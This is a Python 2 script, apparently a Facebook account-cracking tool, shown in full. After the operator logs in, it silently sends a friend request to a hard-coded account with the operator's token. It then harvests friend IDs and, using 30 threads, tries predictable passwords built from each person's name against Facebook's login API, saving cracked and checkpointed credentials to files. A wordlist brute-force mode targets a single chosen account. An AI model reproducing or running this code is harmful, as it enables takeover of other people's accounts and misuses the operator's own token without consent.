#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print "\033[1;96m[!] \x1b[1;91mBack"
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00000.1)


#### LOGO ####
logo = """
/   <🅆🄴🄻🄲🄾🄼🄴>
  \        <CREATED BE TOKYO>  
  
████████  ██████  ██   ██ ██    ██  ██████  
   ██    ██    ██ ██  ██   ██  ██  ██    ██ 
   ██    ██    ██ █████     ████   ██    ██ 
   ██    ██    ██ ██  ██     ██    ██    ██ 
   ██     ██████  ██   ██    ██     ██████  
                                            
                                            
Me:TOKYO

TELEGRAM:// i4m_tokyo

TELEGRAM:CHANNEL//@kurdish_cracker0
===============$$$$$$$$$$================
"""

os.system("clear")
print "࿇ ══━━━━✥ⓌⒺⓁⒸⓄⓂ︎Ⓔ✥━━━━══ ࿇"
print "FOR BEAST TOOL CRACKING FACEBOOK"
print  """
▄▄▄█████▓ ▒█████   ██ ▄█▀▓██   ██▓ ▒█████  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▒██  ██▒▒██▒  ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░   ▒██ ██░▒██░  ██▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄   ░ ▐██▓░▒██   ██░
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄  ░ ██▒▓░░ ████▓▒░
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒   ██▒▒▒ ░ ▒░▒░▒░ 
    ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▓██ ░▒░   ░ ▒ ▒░ 
  ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ▒ ░░  ░ ░ ░ ▒  
             ░ ░  ░  ░    ░ ░         ░ ░  
                          ░ ░                   

Me: TOKYO

TELEGRAM:// i4m_tokyo

TELEGRAM:CHANNEL//@kurdish_cracke0"""

print "╔╣█╠╗╚𝗟𝗢𝗚𝗜𝗡╝╔╣█╠╗"

Username = "kurdish"
Password = "cracker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[\x1b[1;93m✓\x1b[1;96m] \x1b[1;31mUsername\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
    if (username == Username):
        password = raw_input("\033[1;96m[\x1b[1;93m✓\x1b[1;96m] \x1b[1;31mPassword\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
        if (password == Password):
            print "ok " + username
            loop = 'false'
        else:
            print "Eeror"
            os.system('xdg-open https://t.me/kurdishcracker0')
    else:
        print "Eeror"
        os.system('xdg-open https://t.me/kurdish_cracker0')

def login():
    os.system('clear')
    try:
        toket = open('login.txt','r')
        menu() 
    except (KeyError,IOError):
        os.system('clear')
        print logo
        print 42*"\033[1;96m="
        print('\033[1;92m[☆] \x1b[1;91mADD new Facebook \x1b[1;96m[☆]' )
        id = raw_input('\033[1;96m[∞] \x1b[0;31mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('\033[1;96m[∞] \x1b[0;33mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print"\n\033[1;96m[!] \x1b[1;91mEeror"
            keluar()
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
                x=hashlib.new("md5")
                x.update(sig)
                a=x.hexdigest()
                data.update({'sig':a})
                url = "https://api.facebook.com/restserver.php"
                r=requests.get(url,params=data)
                z=json.loads(r.text)
                unikers = open("login.txt", 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;36;40mOk...'
                os.system('xdg-open https://t.me/kurdish_cracker0')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print"\n\x1b[1;91m[!]internet"
                keluar()
        if 'checkpoint' in url:
            print("\n\x1b[1;92m[!]Checkpoint")
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print("\n\x1b[1;93mEeror")
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        os.system('clear')
        print"\x1b[1;91m[!]Token XXX"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print"\033[1;91m[!]Checkpoint"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print"\x1b[1;92m(!)internet"
        keluar()
    os.system("clear")
    print logo
    print "----------------------------------------------------"
    print "[!]Name: "+nama+"/"                               
    print "[!] ID: "+id+"/"
    print "[!] Subs: "+sub+"/"
    print "----------------------------------------------------"
    print "\033[1;32;40m[1] \033[1;33;40m<1>𝗛𝗔𝗖𝗞𝗜𝗡𝗚"    
    print "\033[1;32;40m[2] \033[1;33;40m<2>𝗨𝗣𝗗𝗔𝗧𝗘 𝗧𝗢𝗢𝗟"                                                                                                                        
    print "\033[1;32;40m[0] \033[1;33;40m<0> 𝗟𝗢𝗚𝗢𝗨𝗧"
    pilih()

def pilih():
    unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
    if unikers =="":
        print "\x1b[1;91mEeror"
        pilih()
    elif unikers =="1":        super()
    elif unikers =="2":
        os.system('clear')
        print logo
        print "------------------------------------------------"
        os.system('git pull origin master')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif unikers =="0":
        jalan('Ok')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print "\x1b[1;91mEeror"
        pilih()

def super():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\x1b[1;91mEeror"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo
    print "\x1b[1;32;40m[1] \033[1;33;40m<1<𝗛𝗔𝗖𝗞𝗜𝗡𝗚 𝗙𝗥𝗘𝗜𝗡𝗗"
    print "\x1b[1;32;40m[2] \033[1;33;40m<2>𝗛𝗔𝗖𝗞𝗜𝗡𝗚 𝗜𝗗"
    print "\x1b[1;32;40m[3] \033[1;33;40m<3>𝗪𝗢𝗥𝗟𝗗 𝗟𝗜𝗦𝗧"
    print "\x1b[1;32;40m[4] \033[1;33;40m<4>𝗙𝗜𝗟𝗘"
    print "\x1b[1;32;40m[0] \033[1;33;40m<0>𝗕𝗔𝗖𝗞"
    pilih_super()

def pilih_super():
    peak = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
    if peak =="":
        print "\x1b[1;91mEeror"
        pilih_super()
    elif peak =="1":
        os.system('clear')
        print logo

        jalan('\033[1;93m[✺] wait... \033[1;97m...')
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak =="2":
        os.system('clear')
        print logo
        idt = raw_input("\033[1;96m[∞] Total ID: ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;31;40m[∞] Name : "+op["name"]
        except KeyError:
            print"\x1b[1;92m[∞] ID Eeror!"
            raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
            super()
        print"\033[1;35;40m[∞] wait..."
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif peak =="3":
        os.system('clear')
        print logo
        brute()    
    elif peak =="4":
        os.system('clear')
        print logo                  
        try:
            idlist = raw_input('\x1b[1;96m[+] \x1b[1;93m<</>><</>><</>> \x1b[1;91m: \x1b[1;97m')
            for line in open(idlist,'r').readlines():
                id.append(line.strip())
        except IOError:
            print '\x1b[1;35;40m[!] \x1b[1;35;40mEeror'
            raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mBack \x1b[1;35;40m]')
            super()
    elif peak =="0":
        menu()
    else:
        print "\x1b[1;91mEeror"
        pilih_super()

    
    print "\033[1;36;40m[∞] 𝗔𝗟𝗟 𝗜𝗗 : \033[1;94m"+str(len(id))
    jalan('\033[1;34;40m[∞] 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 ...')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;32;40m[∞] Loading\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
    print ":)"
    print "<PLEASE>"

    jalan('          \033[1;91mWAIT 10min________30min')
    print  "---------------------------------------------------" 

    def main(arg):
        global cekpoint,oks
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass 
        try:
            a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '12'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m\n╔[Very.GOOD] \x1b[1;92m ' + '033[1;35;40m\n║ID: '+ user  + '033[1;35;40m\n║PASS: ' + pass1 + '033[1;35;40m\n╚Name: ' +  b['name']
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print '\x1b[1;36;40m\n╔[sorry.CHECKPOINT]' + '\x1b[1;31m\n║ID: ' + user  + '\x1b[1;31m║PASS: ' + pass1 + '\x1b[1;31m╚Name: ' + b['name']
                    cek = open("out/CP.txt", "a")
                    cek.write(user+"|"+pass1+"\n")
                    cek.close()
                    cekpoint.append(user+pass1)
                else:
                    pass2 = b['first_name'] + '123'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\n\x1b╔[1;92m[Very.GOOD]' + '\n║ID: ' + user  + ' \n║PASS:  ' + pass2 + '\n╚Name: ' + b['name']
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m '+ '\n║ID: ' + user  + '\n║PASS: ' + pass2 + '\n╚Name: ' + b['name']
                            cek = open("out/CP.txt", "a")
                            cek.write(user+"|"+pass2+"\n")
                            cek.close()
                            cekpoint.append(user+pass2)
                        else:
                            pass3 = b['first_name'] + '1234'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\n\x1b╔[1;92m[Very.GOOD] \x1b[1;92m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass3 + '\n╚Name: ' + b['name']
                                oks.append(user+pass3)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass3 + '\n╚Name: ' + b['name']
                                    cek = open("out/CP.txt", "a")
                                    cek.write(user+"|"+pass3+"\n")
                                    cek.close()
                                    cekpoint.append(user+pass4)
                                else:
                                    pass4 = b['first_name'] + '12345'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\n\x1b[1;92m╔[Very.GOOD] \x1b[1;92m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass4 + '\n╚Name: ' + b['name']
                                        oks.append(user+pass4)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m ' +'\n║ID: ' + user  + '\n║PASS: ' + pass4 + '\n╚Name: ' + b['name']
                                            cek = open("out/CP.txt", "a")
                                            cek.write(user+"|"+pass4+"\n")
                                            cek.close()
                                            cekpoint.append(user+pass4)
                                        else:
                                            pass5 = '123456'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\n\x1b[1;92m╔[Very.GOOD] \x1b[1;92m '+ '\n║ID: ' + user  + '\n║PASS: ' + pass5 + '\n╚Name: ' + b['name']
                                                oks.append(user+pass5)
                                            else:
                                                if 'www.facebook.com' in q["error_msg"]:
                                                    print '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m' + '\n║ID: ' + user  + '\n║PASS: ' + pass5 + '\n╚Name: ' + b['name']
                                                    cek = open("out/CP.txt", "a")
                                                    cek.write(user+"|"+pass5+"\n")
                                                    cek.close()
                                                    cekpoint.append(user+pass5)
                                                else:
                                                    pass6 = b['last_name'] + '112233'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\n\x1b[1;92m╔[Very.GOOD] \x1b[1;92m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass6 + '\n╚Name: ' + b['name']
                                                        oks.append(user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q["error_msg"]:
                                                            print '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass6 + '\n╚Name: ' + b['name']
                                                            cek = open("out/CP.txt", "a")
                                                            cek.write(user+"|"+pass6+"\n")
                                                            cek.close()
                                                            cekpoint.append(user+pass6)
                                                        else:
                                                            pass7 = '1234@@'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\n\x1b[1;92m╔[Very.GOOD] \x1b[1;92m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass7 + '\n╚Name: ' + b['name']
                                                                oks.append(user+pass7)
                                                            else:
                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                    print '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass7 + '\n╚Name: ' + b['name']
                                                                    cek = open("out/CP.txt", "a")
                                                                    cek.write(user+"|"+pass7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(user+pass7)
                                                                else:
                                                                    pass8 = ' 123456789'
                                                                    data = urllib.urlopen(
                                                                        "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (
                                                                            user) + "&locale=en_US&password=" + (
                                                                            pass8) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print
                                                                        '\n\x1b[1;92m╔[Very.GOOD] \x1b[1;92m ' + '\n║ID: ' + user + '\n║PASS: ' + pass8 + '\n╚Name: ' + \
                                                                        b['name']
                                                                        oks.append(user + pass8)
                                                                    else:
                                                                        if 'www.facebook.com' in q["error_msg"]:
                                                                            print
                                                                            '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m ' + '\n║ID: ' + user + '\n║PASS: ' + pass8 + '\n╚Name: ' + \
                                                                            b['name']
                                                                            cek = open("out/CP.txt", "a")
                                                                            cek.write(user + "|" + pass8 + "\n")
                                                                            cek.close()
                                                                            cekpoint.append(user + pass8)
                                                                        else:
                                                                            pass9 = '1212'
                                                                            data = urllib.urlopen(
                                                                                "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (
                                                                                    user) + "&locale=en_US&password=" + (
                                                                                    pass9) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print
                                                                                '\n\x1b[1;92m╔[Very.GOOD] \x1b[1;92m ' + '\n║ID: ' + user + '\n║PASS: ' + pass9 + '\n╚Name: ' + \
                                                                                b['name']
                                                                                oks.append(user + pass9)
                                                                            else:
                                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                                    print
                                                                                    '\n\x1b[1;36;40m╔[sorry.CHECKPOINT] \x1b[1;97m ' + '\n║ID: ' + user + '\n║PASS: ' + pass9 + '\n╚Name: ' + \
                                                                                    b['name']
                                                                                    cek = open("out/CP.txt", "a")
                                                                                    cek.write(user + "|" + pass9 + "\n")
                                                                                    cek.close()
                                                                                    cekpoint.append(user + pass9)
                                                                                else:
                                                                                    pass10 = '1122'
                                                                                    data = urllib.urlopen(
                                                                                        "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (
                                                                                            user) + "&locale=en_US&password=" + (
                                                                                            pass10) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print
                                                                                        '\n\x1b[1;92m╔[Very.GOOD] \x1b[1;92m ' + '\n║ID: ' + user + '\n║PASS: ' + pass10 + '\n╚Name: ' + \
                                                                                        b['name']
                                                                                        oks.append(user + pass10)
                                                                                    else:
                                                                                        if 'www.facebook.com' in q[
                                                                                            "error_msg"]:
                                                                                            print
                                                                                            '\n\x1b[1;36;40m[╔sorry.CHECKPOINT] \x1b[1;97m ' + '\n║ID: ' + user + '\n║PASS: ' + pass10 + '\n╚Name: ' + \
                                                                                            b['name']
                                                                                            cek = open("out/CP.txt",
                                                                                                       "a")
                                                                                            cek.write(
                                                                                                user + "|" + pass10 + "\n")
                                                                                            cek.close()
                                                                                            cekpoint.append(
                                                                                                user + pass10)
        except:                                                                        
            pass
        
    p = ThreadPool(30)
    p.map(main, id) 
    
    print '[✓]....'
    print "[+)∞(+] \033[1;32;40mVery.GOOD\033[1;36;40m/\033[1;31;40msorry.CHECKPOINT \033[1;36;40m: \033[1;32;40m"+str(len(oks))+"\033[1;36;40m/\033[1;31;40m"+str(len(cekpoint))
    print '\033[1;34;40m[+] ✓∅✓✓✓✓✓ : save/cp.txt'
    print """-------------------------------"""
    raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
    super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Eeror'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '--------------------------------------------'
        try:
            email = raw_input('\x1b[1;91m[∞] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97m✓✓✓--> \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[∞] \x1b[1;92mWordlist✓<?> \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '---------------------------------'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92m✓✓✓<?> \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[∞] \x1b[1;92mAll\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword!?'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplz wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92meeror'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mEeror'
                            print  "-------------------------------"
                            print '\x1b[1;91m[!] \x1b[1;93msorry Checkpointa'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!]Internet'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!]File.?!!'
            print """\n\x1b[1;91m[!] \x1b[1;92mEeror"""
            super()

if __name__ == '__main__':
    login()
